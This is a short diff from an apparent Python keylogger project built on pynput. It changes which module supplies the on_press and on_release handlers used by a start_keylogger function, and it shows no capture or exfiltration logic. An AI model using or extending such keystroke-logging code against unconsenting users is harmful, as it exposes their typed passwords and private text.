@@ -1,5 +1,5 @@
 from pynput import keyboard
-from src.logger import on_press, on_release
+from src.logger_sentences import on_press, on_release
 
 
 def start_keylogger():
